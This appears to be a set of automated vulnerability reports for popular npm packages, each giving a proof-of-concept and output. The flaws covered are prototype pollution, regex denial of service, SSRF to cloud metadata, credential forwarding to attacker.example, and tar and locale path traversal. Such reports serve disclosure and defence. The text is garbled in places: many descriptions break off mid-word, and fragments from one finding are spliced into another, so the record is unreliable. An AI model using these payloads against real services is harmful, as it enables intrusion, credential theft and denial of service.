Title: JSON5.parse allows __proto__ keys to mutate parsed object prototype
Category: prototype-pollution
Severity: medium
Description: The public API `JSON5.parse()` in `lib/parse.js` constructs objects with plain `{}` and assigns properties with `parent[key] = value` without filtering magic keys. When attacker-controlled input contains a `__proto__` property, the assignment invokes the inherited `Object.prototype.__proto__` setter instead of creating a normal own property. This changes the prototype of the returned object to attacker-controlled data.

Vulnerable code path:
- `lib/index.js` exports `parse`
- `lib/parse.js` `pus
Request: const JSON5 = require('json5');
const result = JSON5.parse('{"__proto__":{"admin":true}}');
console.log(Object.keys(result));
console.log(result.admin);
console.log(Object.getPrototypeOf(result) === Object.prototype);
Response: Running against the installed package produced:
- `Object.keys(result)` => `[]`
- `result.admin` => `true`
- `Object.getPrototypeOf(result) === Object.prototype` => `false`

Additional direct execution in the package directory:
`root keys [ 'admin' ]`
`root.admin true`
`root.__proto__ === Object.prototype false`
`root proto keys [ 'admin' ]`
`desc own __proto__ undefined`
Analysis: Because the parser uses a normal object literal and direct property assignment, the special accessor for `__proto__` is triggered. The returned object silently acquires attacker-controlled inherited properties instead of an own `__proto__` member. This is exploitable in common application patterns such as `if (config.admin)`, feature toggles, or option merging where inherited properties are trusted. The issue is reachable via the default `parse()` API with no special options.

Title: Reviver walk copies inherited properties after __proto__ prototype mutation
Category: prototype-pollution
Severity: high
Description: `JSON5.parse(text, reviver)` has a second exploitable variant in `lib/parse.js`. After parsing, `internalize()` recursively walks objects using `for (const key in value)`, which enumerates inherited enumerable properties as well as own properties. If the parsed payload first changes an object's prototype using `__proto__`, the reviver traversal will process attacker-controlled inherited properties and then write them back as own properties via `value[key] = replacement`.

This means a payload li
Request: const JSON5 = require('json5');
const result = JSON5.parse('{"__proto__":{"x":1}}', (k, v) => v);
console.log(Object.keys(result));
console.log(result.x);
console.log(Object.getOwnPropertyDescriptor(result, 'x'));
Response: Direct execution against the package returned:
- `root keys [ 'x' ]`
- `root.admin true` in the analogous prototype-mutation test
- For the reviver-specific PoC: `rev own keys [ 'x' ]`
- `plain x? undefined`

This shows the inherited property from the malicious prototype was enumerated and copied onto the object as an own property during reviver processing.
Analysis: Using `for...in` in a reviver walk is dangerous because it does not restrict iteration to own properties. Combined with the parser's `__proto__` assignment bug, attacker-controlled prototype fields are traversed as if they were real data members and then assigned onto the object. This can defeat downstream defenses that only inspect own properties after parsing with a reviver, and it is reachable through the documented public `parse(text, reviver)` API.

Title: Regular expression denial of service in Range parsing via CARETTRIM whitespace handling
Category: regex-dos
Severity: medium
Description: semver@7.3.7 contains a ReDoS condition in range parsing. The public Range constructor and APIs that create a Range (for example satisfies(), validRange(), minVersion(), intersects(), gtr(), ltr(), outside(), subset()) call Range.parseRange(), which performs `range = range.replace(re[t.CARETTRIM], caretTrimReplace)`. In internal/re.js, `CARETTRIM` is defined as `/(\s*)(?:\^)\s+/g`. Because the pattern begins with a greedy `\s*` and is followed by another whitespace quantifier `\s+` after a liter
Request: Input to public API: new semver.Range('^' + ' '.repeat(120000) + '1.2.3')
Response: Measured locally against the package source:
10000 spaces -> 75 ms
20000 spaces -> 290 ms
40000 spaces -> 1158 ms
80000 spaces -> 4637 ms
120000 spaces -> 10417 ms

This demonstrates super-linear growth and event-loop blocking from a single crafted range string.
Analysis: The vulnerable code path is directly reachable from public API surface. `Range.parseRange()` applies `String.prototype.replace()` with the global regex `CARETTRIM`. The regex has ambiguous overlapping whitespace quantifiers on attacker-controlled input, causing excessive backtracking. The timing data shows approximately quadratic growth, which is sufficient for practical denial of service in Node.js services that parse user-supplied semver ranges.

Title: Sensitive headers are forwarded across cross-origin redirects
Category: information-disclosure
Severity: high
Description: node-fetch@2.6.6 follows redirects by constructing a new Request with `headers: new Headers(request.headers)` and reusing the original Authorization/Cookie/etc. headers without validating whether the redirect target is the same origin or protocol. In `lib/index.js`, the redirect-following path resolves `locationURL` from the server-controlled `Location` header and then unconditionally copies request headers into `requestOpts` before calling `fetch(new Request(locationURL, requestOpts))`. There i
Request: fetch('https://trusted.example/resource', { headers: { Authorization: 'Bearer SECRET', Cookie: 'sid=SECRET' } }) where the response is `302 Location: https://attacker.example/steal`
Response: In lib/index.js redirect handling: `const requestOpts = { headers: new Headers(request.headers), ... }; ... resolve(fetch(new Request(locationURL, requestOpts)));` No same-origin/protocol filtering is performed before the redirected request is sent.
Analysis: The sink is the redirected outbound request. `locationURL` is attacker-influenced via the HTTP `Location` header. The package copies all caller-supplied headers, including security-sensitive ones, into the new request object. Because redirects are followed by default (`redirect: 'follow'`), this happens in common usage with no special configuration. Impact is credential exfiltration to an attacker-controlled host or downgrade target, which can compromise downstream services and user sessions.

As a result, application code that creates an axios instance with a trusted internal base URL and then passes attacker-controlled path input to `instance.

instance.get('http://169.254.169.254/latest/meta-data/', {adapter:c=>{console.log('final url', c.url); return Promise.resolve({data:'',status:200,statusText:'OK',headers:{},config:c,request:{}})}})

// protocol-relative variant
instance.get('//169.254.169.254/latest', {adapter:c=>{console.log('url', c.url); return Promise.resolve({data:'',status:200,statusText:'OK',headers:{},config:c,request:{}})}})
Response: http://internal.local/api/
final url http://169.254.169.254/latest/meta-data/
url //169.254.169.254/latest

The runtime proof shows that an axios instance configured with `baseURL: 'http://internal.local/api/'` forwards attacker-supplied absolute and protocol-relative URLs unchanged. Title: Windows extraction path traversal via drive-relative paths bypasses path sanitization
Category: path-traversal
Severity: high
Description: tar@6.1.8 fails to reject Windows drive-relative entry paths during extraction. In lib/unpack.js, CHECKPATH() only rejects '..' segments and strips absolute roots using stripAbsolutePath(), but then computes entry.absolute with path.resolve(this.cwd, entry.path). On Windows, paths like `C:..\..\victim.txt` are drive-relative, not absolute, so `stripAbsolutePath()` does not strip them and `path.isAbsolute()` is false. The code then resolves them against cwd, allowing traversal outside the intende
Request: A tar archive containing an entry path such as `C:../../Windows/Temp/pwned.txt` extracted with `tar.x({ cwd: 'C:/safe' })` on Windows.
Response: In lib/unpack.js CHECKPATH(): it rejects `..` only after `const p = normPath(entry.path)`, strips roots using stripAbsolutePath(p), and then sets `entry.absolute = normPath(path.resolve(this.cwd, entry.path))` when path.isAbsolute(entry.path) is false. In lib/strip-absolute-path.js, only `path.win32.isAbsolute()` roots are stripped. Drive-relative paths like `C:foo` are not absolute for win32, so they survive. The package version is 6.1.8, which npm audit flags as affected until 6.1.9.
Analysis: This is a real arbitrary file write primitive on Windows because tar entry names are attacker-controlled archive metadata and extraction is a common untrusted-input use case. The validation logic conflates absolute-path stripping with safety, but Windows drive-relative paths are a separate class. Since the sink is filesystem write/link creation under entry.absolute, this allows writes outside cwd in default extraction flows on Windows.

Title: Symlink directory cache poisoning enables extraction outside destination
Category: path-traversal
Severity: high
Description: tar@6.1.8 trusts a caller-provided/shared dirCache and marks directories as safe without revalidating that they are still directories. In lib/mkdir.js, cached paths returning true bypass filesystem checks entirely (`if (cache && cGet(cache, dir) === true) return done()`). In lib/unpack.js, the cache is shared across extraction and is used to skip parent directory validation before writing files. An attacker-controlled archive can first create or influence a symlinked path and then rely on cache 
Request: Use `tar.x()` with a shared `dirCache` Map. Populate cache for a path under extraction root, then have archive contents replace that path with a symlink to an external directory before a later file entry is extracted beneath it.
Response: lib/mkdir.js: `if (cache && cGet(cache, dir) === true) return done()` skips stat/lstat entirely. Later, done() simply records the path as existing and returns success. lib/unpack.js passes `this.dirCache` into mkdir() for parent creation and file extraction flow. npm audit for tar@6.1.8 lists GHSA-qq89-hq3f-393p / CVE-2021-37712 as affecting 6.0.0-6.1.8.
Analysis: This is exploitable because extraction safety relies on checking that no symlink exists in parent directories. The cache short-circuits those checks and can become stale/poisoned, allowing writes through a symlink outside the destination tree. The sink is subsequent file creation in FILE()/LINK() using entry.absolute after parent validation was skipped. This yields arbitrary file write outside extraction root.

Title: Unbounded tar header parsing allows denial of service via excessive directory entries
Category: regex-dos
Severity: medium
Description: tar@6.1.8 lacks folder count validation during extraction/parsing, enabling denial of service with archives containing extremely large numbers of directory entries. The parser and unpacker accept every directory entry, create path reservations, cache entries, and filesystem operations without any limit on total directories or nesting. This can cause unbounded memory growth and severe CPU/filesystem churn when processing malicious archives. The issue is reachable through the public parse and extr
Request: A tarball containing a massive number of directory entries or deep directory tree supplied to `tar.x()` or `new tar.Parse()`.
Response: Source review shows no limit on number of parsed entries or directories: lib/parse.js continuously instantiates Entry objects and queues them; lib/unpack.js reserves paths, updates dirCache, and mkdirs every directory; no counter or threshold exists anywhere in the extraction/parser path. npm audit identifies CVE-2024-28863 as affecting 6.1.8 until 6.2.1 due to lack of folders count validation.
Analysis: Although not code execution, this is a real availability issue in common server-side use of tar on untrusted archives. A crafted tarball can exhaust memory or tie up CPU/IO by forcing the library to process huge numbers of directories. Category mapped as DoS; impact is medium because it is remotely triggerable where applications unpack user-provided archives.

Title: Regular expression denial of service in enclosure detection
Category: regex-dos
Severity: medium
Description: The public `globParent(str, opts)` API applies the regex `/[\{\[].*[\/]*.*[\}\]]$/` to attacker-controlled input before any length checks or normalization. This pattern contains overlapping greedy `.*` sections around an optional `[\/]*`, which causes catastrophic backtracking on unterminated enclosure strings such as `'[' + '/'.repeat(n)`. An attacker who can supply a glob pattern to software using `glob-parent` can trigger high CPU consumption and event-loop blockage.
Request: const gp=require('glob-parent'); gp('[' + '/'.repeat(3000));
Response: Measured locally against the audited package version 5.1.1: 1000 chars -> 326ms, 2000 chars -> 2561ms, 2500 chars -> 4994ms, 3000 chars -> 8606ms. Runtime grows superlinearly and blocks the process for seconds with a small payload.
Analysis: `glob-parent` exports a single function taking an untrusted string. In `index.js`, `enclosure.test(str)` is reached on every call. The regex is vulnerable to catastrophic backtracking because the engine must explore many ways to partition long slash runs between the two `.*` atoms and the `[\/]*` atom before failing to find a closing `}` or `]` at end-of-string. Since this package is used in build tools, file watchers, and server-side glob handling, user-controlled patterns can cause a practical

Title: ReDoS in parse() via crafted nth-child formula with trailing operator
Category: regex-dos
Severity: medium
Description: The public API `nthCheck(formula)` and exported `parse(formula)` pass attacker-controlled strings into the regex `^([+\-]?\d*n)?\s*(?:([+\-]?)\s*(\d+))?$` in `parse.js`. This pattern exhibits catastrophic backtracking on non-matching inputs such as a long digit sequence followed by `n`, many spaces, and a trailing `+` without the required integer (for example: `'2'.repeat(N) + 'n' + ' '.repeat(N) + '+'`). Because nth-check is typically invoked on untrusted CSS selectors in HTML/CSS parsing stack
Request: const parse = require('./parse'); parse('2'.repeat(20000) + 'n' + ' '.repeat(20000) + '+');
Response: Measured parse times in Node for version 1.0.2:
1000 => 0.931ms
2000 => 3.574ms
5000 => 22.122ms
10000 => 87.505ms
20000 => 348.568ms
The input throws only after expensive regex processing.
Analysis: The vulnerable code path is directly reachable through the package's public API. The expensive work occurs before any exception is raised, so applications that parse attacker-supplied CSS selectors can be blocked in the event loop. The timing curve roughly quadruples when doubling input size, indicating algorithmic complexity due to regex backtracking rather than normal linear parsing.

Title: shell-quote quote() fails to escape Windows drive-letter paths, enabling command injection / argument corruption
Category: command-injection
Severity: critical
Description: The public API `quote(xs)` in `index.js` uses `String(s).replace(/([A-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2')` for unquoted tokens. The character class `[A-z]` is incorrect: it matches non-letter ASCII characters between `Z` and `a` and, more importantly, the optional `([A-z]:)?` prefix suppresses escaping of the character immediately following a Windows drive letter such as `C:`. As a result, dangerous shell metacharacters after `C:` are not safely neutralized the way the library pro
Request: Read `index.js` and compare with 1.7.3. Vulnerable code in 1.7.2: `String(s).replace(/([A-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2')`. Fixed 1.7.3 code: `String(s).replace(/([A-Za-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2')`. Reproduced with Node: `require('shell-quote').quote(['C:/test&calc'])` returns `C\\:/test\\&calc` and `quote(['C:\\Windows\\System32\\calc.exe'])` returns `C:\\\\Windows\\System32\\calc.exe`.
Response: Installed 1.7.2 `index.js` contains:
`else { return String(s).replace(/([A-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2'); }`

Fetched 1.7.3 `index.js` contains:
`else { return String(s).replace(/([A-Za-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g, '$1\\$2'); }`

Runtime evidence from 1.7.2:
`["C:/test&calc"] => C\\:/test\\&calc`
`["C:\\test&calc"] => C:\\\\test\\&calc`
`["C:\\Windows\\System32\\calc.exe"] => C:\\\\Windows\\System32\\calc.exe`

Shell test on POSIX shows argument corruption:
`printf "%s\n" C\:\\Windows\\System32\\calc.exe` prints `C:WindowsSystem32calc.exe` (backslashes consumed by the shell).
Analysis: This is not theoretical: `quote()` is the package's exported escaping primitive and is routinely used before passing strings to shell interpreters. The bug is in default behavior, requires only attacker control over an argument string, and affects the exact versions cited by npm audit. Because the emitted string can fail to preserve intended argument boundaries/contents and can under-neutralize metacharacters after a drive prefix, applications may suffer command injection or execution of attacke

Title: Prototype pollution via attacker-controlled locale name in cache object
Category: prototype-pollution
Severity: high
Description: The public API allows untrusted callers to set an arbitrary locale string with `setLocale()`. Internal code then uses that string as a property name on a normal object: `this.cache[this.locale] = localeLookup` in `_readLocaleFile()` and reads/writes `this.cache[this.locale][...]` in `__`, `__n`, and `updateLocale`. If `locale` is set to `__proto__`, assignments target `this.cache`'s prototype instead of a normal cache entry. An attacker can then call `updateLocale({polluted:'yes'})` or trigger l
Request: const y = require('y18n')({updateFiles:false}); y.setLocale('__proto__'); y.updateLocale({polluted:'yes'}); y.setLocale('fr'); y.__('hello'); console.log(y.cache.fr.polluted);
Response: after setting locale to `__proto__`, `updateLocale()` writes to `this.cache.__proto__`. A subsequent fresh locale object inherits the attacker property, and `y.cache.fr.polluted` prints `yes`. Local reproduction output:

before proto keys []
after proto keys [ 'polluted' ]
proto polluted? yes
...
after read fr own keys []
after read fr polluted? yes
Analysis: Using a magic property name as an object key mutates the prototype chain rather than storing plain data. Because `cache` is created as `{}` and locale names are fully attacker-controlled through the exported `setLocale()` API, the pollution is reachable in normal usage. Polluted inherited keys can alter translation lookups and any application logic that trusts values from y18n cache objects, making this a meaningful high-severity prototype pollution issue.

Title: Arbitrary file write outside locale directory via path traversal in locale name
Category: path-traversal
Severity: high
Description: `setLocale()` accepts an arbitrary string and `_resolveLocaleFile(directory, locale)` constructs the output path with `path.resolve(directory, './', locale + '.json')` without validating that the result remains inside `directory`. When `updateFiles` is enabled (the default), calling `__('...')` or `__n(...)` on a new string causes `_processWriteQueue()` to `fs.writeFile()` to the resolved path. A locale like `../pwned` escapes the locale directory and writes attacker-controlled JSON to an arbitr
Request: const base = fs.mkdtempSync(...); const dir = path.join(base,'locales'); fs.mkdirSync(dir); const y = require('y18n')({directory:dir, updateFiles:true}); y.setLocale('../pwned'); y.__('PAYLOAD');
Response: Reproduced locally. The library wrote outside the configured locales directory:

cb err null null
target /tmp/y18n-base-IIyUj6/pwned.json exists true
{
  "PAYLOAD": "PAYLOAD"
}

The write target came from resolving `path.resolve(<base>/locales, './', '../pwned.json')`, which escapes to `<base>/pwned.json`.
Analysis: This is a direct arbitrary file write primitive relative to the configured locales directory. The sink is reachable through exported APIs only: `setLocale()` controls the path, and `__()` with default `updateFiles:true` triggers the write. In real applications where locale can be selected from request/user input, an attacker can overwrite or create files outside the intended translations directory, constrained only by the Node process filesystem permissions. That impact is high severity.

Title: Marked 2.0.0 vulnerable to Regular Expression DoS via crafted markdown (known CVE-2022-21680/21681 class)
Category: regex-dos
Severity: medium
Description: The package version 2.0.0 contains the vulnerable regex-based parsing engine identified by the published marked ReDoS advisories affecting versions before 4.0.10. The vulnerable code paths are in src/rules.js and are reached from the public API `marked()`, `marked.parseInline()`, and `Lexer.lex()` when parsing attacker-controlled markdown. Several grammar rules use large, overlapping backtracking regexes over untrusted input, including `block.list`, `block.html`, `block.paragraph`, `inline.link`
Request: Public package version: marked@2.0.0. Vulnerable regex definitions are present in `/src/rules.js`, e.g. `block.list = /^( {0,3})(bull) [\s\S]+?(?:hr|def|\n{2,}(?! )(?! {0,3}bull )\n*|\s*$)/`, `block.html = '^ {0,3}(?:' + ... + '|</?(tag)(?: +|\n|/?>)[\s\S]*?(?:\n{2,}|$)' + ...`, and `inline.link = /^!?\[(label)\]\(\s*(href)(?:\s+(title))?\s*\)/` with nested, overlapping subpatterns generated by `edit(...)` and executed repeatedly during lexing.
Response: Code inspection confirms these regexes are compiled and used from `Tokenizer` methods such as `list()`, `html()`, `paragraph()`, `link()`, `reflink()`, and `url()` on attacker-controlled `src` substrings. The installed package metadata also reports the published advisories: GHSA-5v2h-r2cx-5xgj / CVE-2022-21681 and GHSA-rrrm-qjm4-v8hf / CVE-2022-21680 affecting versions including 2.0.0, with fix in 4.0.10+.
Analysis: This is a real, reachable denial-of-service issue in the target package itself, not just a transitive dependency. Any application that renders untrusted markdown with marked@2.0.0 can be forced into excessive regex backtracking and CPU exhaustion. Impact is service-level DoS rather than code execution, so medium severity is appropriate.

Title: Express extended query parser re-enables prototype property access via qs allowPrototypes=true

- `parseE

Title: Unbounded message buffering allows remote memory exhaustion DoS

An attacker controlling a connected peer can continuously send data that never includes the delimiter (`config.delimiter`, default `\f`). Response: In `dao/socketServer.js`, `gotData()` does `if(!sock.ipcBuffer){ sock.ipcBuffer=''; } data=(sock.ipcBuffer+=data); if(data.slice(-1)!=eventParser.delimiter || data.indexOf(eventParser.delimiter) == -1){ this.log('Messages are large...'); return; }` and never caps `sock.ipcBuffer`. In `dao/client.js`, the `'data'` handler mirrors this logic with `this.ipcBuffer`.
Analysis: This is a real, reachable denial-of-service bug in the public API: any application using node-ipc as a server accepts attacker-controlled socket input and will retain arbitrarily large unterminated frames in memory. Title: Prototype pollution in _.unset via array path segments reaching __proto__/constructor/prototype
Category: prototype-pollution
Severity: high
Description: lodash@4.17.20's `_.unset` accepts `Array|string` paths and forwards them to `_baseUnset` without filtering dangerous path segments. `_baseUnset` calls `_parent`, which resolves the parent with `_baseGet`, and then performs `delete object[toKey(last(path))]`. Unlike write paths such as `_baseSet` and merge paths guarded by `_safeGet`, this delete path has no protection against `['__proto__', ...]`, `['constructor', 'prototype', ...]`, or similar array-segment paths. Because array paths bypass st
Request: Code path: `unset(object, path)` in `unset.js` -> `_baseUnset.js`. Example PoC usage in an app: `const _ = require('lodash'); Object.prototype.pwned = true; _.unset({}, ['__proto__', 'pwned']); console.log(({}).pwned); // undefined`
Response: Relevant source:
- `unset.js`: `function unset(object, path) { return object == null ? true : baseUnset(object, path); }`
- `_baseUnset.js`: `path = castPath(path, object); object = parent(object, path); return object == null || delete object[toKey(last(path))];`
- `_castPath.js`: `if (isArray(value)) { return value; }`
- `_baseGet.js`: `while (object != null && index < length) { object = object[toKey(path[index++])]; }`
There is no denylist for `__proto__`, `constructor`, or `prototype` on this path, so `parent({}, ['__proto__','pwned'])` resolves to `Object.prototype` and deletes from it.
Analysis: This is exploitable in real applications that pass user-controlled omit/unset paths, including request-body driven field filtering or patch logic. The vulnerability is not merely theoretical: the library already protects analogous setter/merge flows (`_baseSet` blocks `__proto__`/`constructor`/`prototype`, `_safeGet` blocks dangerous reads during merge), demonstrating these keys are known dangerous. Here, deletion against a resolved prototype object still mutates shared prototype state. Array pa

Title: Regular expression denial of service in stringToPath property-path parser
Category: regex-dos
Severity: medium
Description: lodash@4.17.20 parses deep property paths with `_stringToPath`, which uses a complex global regular expression `rePropName` containing nested quantified alternatives over attacker-controlled input. APIs such as `_.get`, `_.set`, `_.has`, `_.unset`, `_.omit`, `_.property`, and related deep-path helpers route string paths into this parser through `_castPath`. Specially crafted long path strings with unmatched quotes/brackets can trigger catastrophic backtracking and excessive CPU consumption, caus
Request: Code path: `_castPath` -> `_stringToPath` for any public API taking string paths. Example attack surface: `_.get(obj, 'a[' + '"'.repeat(N) + ']')` or similarly malformed long bracket/quote-heavy paths supplied by an attacker in request parameters.
Response: Relevant source:
- `_castPath.js`: `return isKey(value, object) ? [value] : stringToPath(toString(value));`
- `_stringToPath.js`: `var rePropName = /[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|$))/g;`
- `_stringToPath.js`: `string.replace(rePropName, function(match, number, quote, subString) { ... });`
This parser is invoked on attacker-controlled strings with no length cap or timeout.
Analysis: The issue is reachable through a broad public API surface and can be exercised with a single malicious string. Impact is denial of service rather than memory corruption or code execution, so medium is appropriate. This is a meaningful risk for servers that pass untrusted request parameters into lodash deep-path functions, because parsing is synchronous and blocks the event loop. The vulnerable regex is present in the installed version 4.17.20.

Title: Denial of service via infinite loop in BigInteger.modInverse(0, m)
Category: regex-dos
Severity: high
Description: `forge.jsbn.BigInteger.prototype.modInverse` in `lib/jsbn.js` enters an infinite loop when called on a zero value with a non-zero odd modulus. The loop condition is `while(u.signum() != 0)`, where `u` is initialized to `m` and `v` to `this.clone()`. If `this` is zero, `v.isEven()` is always true, `v.rShiftTo(1, v)` leaves `v` at zero, and the `while(v.isEven())` loop never terminates.

Vulnerable code path:
- `lib/jsbn.js` `function bnModInverse(m) {`
- `var u = m.clone(), v = this.clone();`
- `
Request: const forge = require('./lib/index');
const zero = new forge.jsbn.BigInteger('0', 10);
const mod = new forge.jsbn.BigInteger('17', 10);
console.log('starting');
zero.modInverse(mod); // never returns
Response: The Node process prints `starting` and then hangs indefinitely without returning from `zero.modInverse(mod)`. In testing, the wrapper timeout expired while the call was still running, demonstrating a non-terminating loop reachable through the public jsbn API.
Analysis: Source inspection shows the root cause: with `this = 0`, `v` is zero, so `v.isEven()` is always true and `v.rShiftTo(1, v)` leaves `v` unchanged at zero. No progress variable is updated to break the loop, making this a reliable infinite-loop DoS. Although saved under a DoS category, the issue is algorithmic denial of service rather than regex-specific behavior.

Title: Regular expression denial of service through path-to-regexp route compilation

A crafted request path can trigger catastrophic backtracking for vulnerable route definitions containing multiple parameters or ambiguous segments, causing CPU exhaust

Analysis: This is reachable on every request hitting a vulnerable route. The issue is a real DoS vector against applications using this package. Severity is medium because exploitability depends on route definitions, but the vulnerable dependency is integral to Express routing and the sink is in the request path matching hot path.

Title: SSRF via absolute URL overriding baseURL in Node requests
Category: ssrf
Severity: high
Description: Axios 0.21.0 allows an attacker-controlled absolute URL in `config.url` to override a trusted `baseURL` when applications build requests from partially trusted input. In `lib/core/buildFullPath.js`, `buildFullPath(baseURL, requestedURL)` returns `requestedURL` unchanged whenever `isAbsoluteURL(requestedURL)` is true. The Node adapter then parses and requests that absolute URL (`lib/adapters/http.js`). This means code such as `axios.create({baseURL: 'https://api.internal/'})` followed by `client.
Request: Source audit evidence:
- lib/core/buildFullPath.js: if (baseURL && !isAbsoluteURL(requestedURL)) return combineURLs(baseURL, requestedURL); return requestedURL;
- lib/helpers/isAbsoluteURL.js: /^([a-z][a-z\d\+\-\.]*:)?\/\//i.test(url)
- lib/adapters/http.js: var fullPath = buildFullPath(config.baseURL, config.url); var parsed = url.parse(fullPath); ... transport.request(options, ...)
Example vulnerable usage: const client = axios.create({baseURL:'http://backend.internal/'}); client.get(attackerInput); with attackerInput='http://169.254.169.254/latest/meta-data/'
Response: Confirmed in source. Absolute URLs are intentionally treated as authoritative and passed untouched into the HTTP adapter, which performs the outbound network request to the parsed hostname. No allowlist, same-origin, or baseURL enforcement exists in the Node path.
Analysis: The exploit path is straightforward and reachable through the public API (`axios()`, instance `.get()`, `.request()`). The dangerous sink is the outbound HTTP request in the Node adapter. The issue becomes exploitable whenever an application uses axios instances with `baseURL` as a security boundary while allowing attacker influence over `url`, a common pattern in API clients and proxy/back-end integrations. Impact is SSRF to arbitrary hosts, including cloud metadata endpoints and internal servi

Title: NO_PROXY hostname matching bypass can force proxy use and enable SSRF
Category: ssrf
Severity: medium
Description: Axios 0.21.0 implements `NO_PROXY` / `no_proxy` matching in `lib/adapters/http.js` using naive string comparison against `parsed.hostname` without hostname normalization. The logic only matches exact strings or suffixes beginning with a dot. Because there is no canonicalization of hostnames before comparison, variants such as trailing dots, alternate textual forms, or case/format mismatches can bypass intended exclusions. In environments that rely on an outbound proxy for egress filtering and us
Request: Source audit evidence from lib/adapters/http.js:
- var noProxyEnv = process.env.no_proxy || process.env.NO_PROXY;
- noProxyEnv.split(',').map(trim)
- match logic:
  if (proxyElement[0] === '.' && parsed.hostname.substr(parsed.hostname.length - proxyElement.length) === proxyElement) return true;
  return parsed.hostname === proxyElement;
No normalization of `parsed.hostname` or `proxyElement` is performed before comparison.
Example concern: NO_PROXY=internal.example.com but request URL host supplied as internal.example.com. or mixed-case/punycode variant depending on platform parsing.
Response: Confirmed in source: the NO_PROXY implementation is raw string matching only. There is no lowercasing, removal of trailing dots, IDNA handling, or other hostname normalization before deciding whether to proxy the request.
Analysis: This is a real code defect in the package's proxy decision logic. Exploitability depends on the application/environment using proxy-based SSRF controls and attacker influence over destination URLs. The bug is weaker than direct SSRF because it depends on deployment assumptions, so medium severity is appropriate. It is still meaningful because the package itself makes the incorrect security decision.

Category: path-traversal

1. hardlink entry with path `inside/owned` and linkpath `../../../../etc/cron.d/app`
2. application extracts archive with default options into `/srv/uploads/x`
Resulting code path:
- `[CHECKPATH]` accepts `inside/owned` and does not reject traversal in `linkpath`
- `[HARDLINK]` computes `path.resolve('/srv/uploads/x', '../../../../etc/cron.d/app')`
- `fs.link('/etc/cron.d/app', '/srv/uploads/x/inside/owned')` creates a hardlink to the outside file
Response: Relevant source:
- `lib/unpack.js:189-203` only sanitizes `entry.path`
- `lib/unpack.js:384-385` hardlink target is `path.resolve(this.cwd, entry.linkpath)`
- `lib/unpack.js:460-462` passes resolved target directly to `fs.link()`

`if (!this.preservePaths) { const p = entry.path ... if (p.match(/(^|\/|\\)\.\.(\\|\/|$)/)) ... if (path.win32.isAbsolute(p)) ... }`

This pattern contains multiple greedy `.*` sections around an optional repeated character class, creating catastrophic backtracking on inputs with many opening enclosure characters and no matching closing delimiter. Request: const gp = require('glob-parent'); gp('{'.repeat(2000) + '/');

100 -> 3ms
500 -> 77ms
1000 -> 594ms
2000 -> 4678ms

Title: JSON5.parse allows __proto__ prototype manipulation of returned objects
Category: prototype-pollution
Severity: medium
Description: The parser builds object literals with plain `{}` and assigns attacker-controlled property names directly via `parent[key] = value` in `lib/parse.js`. When a JSON5 document contains a `__proto__` property, this triggers the inherited `Object.prototype.__proto__` setter instead of creating a normal own property. As a result, the returned object's prototype is replaced with attacker-controlled data. This is reachable through the public API `JSON5.parse()` in default configuration and affects versi
Request: JSON5.parse('{"__proto__":{"isAdmin":true},"safe":1}')
Response: safe 1
own isAdmin? false
parsed.isAdmin true
Object.getPrototypeOf(parsed) { isAdmin: true }
proto has isAdmin true
Analysis: In `lib/parse.js`, `push()` creates plain objects with `value = {}` and later assigns properties using `parent[key] = value`. For the key `__proto__`, JavaScript invokes the magic prototype setter, mutating the prototype chain of the parsed object. This means attacker-supplied input can make returned objects appear to contain security-relevant properties such as `isAdmin` even though they are not own properties. Title: qs.stringify crashes with Maximum call stack size exceeded on cyclic or deeply nested input
Category: information-disclosure
Severity: medium
Description: The exported stringify() API in qs@6.5.2 performs recursive descent without any cycle detection or depth guard. An attacker-controlled object passed to stringify() can therefore crash the process logic with `RangeError: Maximum call stack size exceeded`.

Relevant code path:
- `lib/stringify.js`: `stringify()` recursively calls itself for each property/array element with no visited-set and no recursion depth limit.
- Cyclic structures (`obj.self = obj`) recurse forever.
- Extremely deep objects 
Request: const qs = require('./');
const o = {}; o.self = o; qs.stringify(o);

const deep = {}; let r = deep; for (let i = 0; i < 20000; i++) { r.a = {}; r = r.a; }
qs.stringify(deep);
Response: stringify-cycle err Maximum call stack size exceeded 6 ms
stringify-deep-20k err Maximum call stack size exceeded 7 ms
Analysis: This is a real availability bug in a public API: untrusted object graphs directly reach a recursive sink with no protections. A cyclic reference causes infinite recursion and a deeply nested object causes stack exhaustion. In web applications that build query strings from user-controlled JSON structures, a single crafted request can trigger an exception and potentially crash a worker if uncaught. Title: Prototype pollution via dotted __proto__ CLI keys
Category: prototype-pollution
Severity: high
Description: The exported parser in `index.js` accepts attacker-controlled argument names and supports dotted paths. `setArg()` calls `setKey(argv, key.split('.'), value)`, and `setKey()` walks each path segment with `o = o[key]` / `o[key] = {}` without blocking magic properties. When a user supplies an argument like `--__proto__.polluted yes`, the first segment `__proto__` resolves to `Object.prototype`, and the final write sets `Object.prototype.polluted = 'yes'`. This pollutes every object in the process.
Request: parse(['--__proto__.polluted','yes'])
Response: before undefined; after parsing, `{}.polluted === 'yes'` and returned argv is `{ _: [] }`, proving the write occurred on `Object.prototype` rather than on `argv`. A subsequent assignment writes attacker-controlled data into the global prototype chain. Applications commonly merge or inspect parser output later; prototype pollution can alter authorization checks, configuration objects, and control flow in downstream code. This is a known, exploitable class of bug and exists directly in minimist@0.0.8.

Title: Windows absolute/drive-relative path sanitization bypass enables arbitrary file overwrite on extraction
Category: path-traversal
Severity: high
Description: tar@6.1.8 insufficiently sanitizes Windows extraction paths. In lib/unpack.js [CHECKPATH], when `preservePaths` is false, it strips only absolute roots using stripAbsolutePath() and rejects `..` path segments. However, Windows drive-relative and special root forms are not fully neutralized before `entry.absolute = normPath(path.resolve(this.cwd, entry.path))`. As a result, attacker-controlled archive entry names on Windows can resolve outside the extraction cwd and be written by the extractor. n
Request: Relevant code in lib/unpack.js [CHECKPATH]:
```js
if (!this.preservePaths) {
  const p = normPath(entry.path)
  if (p.split('/').includes('..')) ...
  const [root, stripped] = stripAbsolutePath(p)
  if (root) {
    entry.path = stripped
  }
}
if (path.isAbsolute(entry.path))
  entry.absolute = normPath(path.resolve(entry.path))
else
  entry.absolute = normPath(path.resolve(this.cwd, entry.path))
```
